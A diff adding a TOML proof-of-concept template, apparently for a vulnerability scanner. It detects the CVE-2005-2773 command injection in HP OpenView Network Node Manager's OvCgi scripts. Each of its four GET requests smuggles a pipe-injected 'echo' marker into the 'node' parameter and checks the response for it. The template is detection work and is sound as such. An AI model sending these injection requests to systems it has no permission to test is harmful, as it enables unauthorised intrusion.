@@ -1,0 +1,95 @@
+[info]
+id = "POC-AVE-2005-0001"
+name = "HP OpenView Network Node Manager 远程命令执行 PoC"
+author = "AVE"
+severity = "critical"
+tags = ["cve-2005-2773", "command-injection", "rce"]
+description = "HP OpenView Network Node Manager OvCgi 脚本存在命令注入漏洞，通过向 node 参数注入管道符可执行任意系统命令"
+vuln_id = ["CVE-2005-2773", "AVE-2005-0001"]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/OvCgi/connectedNodes.ovpl"
+
+[poc.requests.headers]
+Host = "{{Hostname}}"
+
+[poc.requests.query]
+node = "|echo AVEPOCEV0"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["AVEPOCEV0"]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/OvCgi/cdpView.ovpl"
+
+[poc.requests.headers]
+Host = "{{Hostname}}"
+
+[poc.requests.query]
+node = "|echo AVEPOCEV1"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["AVEPOCEV1"]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/OvCgi/freeIPaddrs.ovpl"
+
+[poc.requests.headers]
+Host = "{{Hostname}}"
+
+[poc.requests.query]
+node = "|echo AVEPOCEV2"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["AVEPOCEV2"]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/OvCgi/ecscmg.ovpl"
+
+[poc.requests.headers]
+Host = "{{Hostname}}"
+
+[poc.requests.query]
+node = "|echo AVEPOCEV3"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["AVEPOCEV3"]
+expect = true
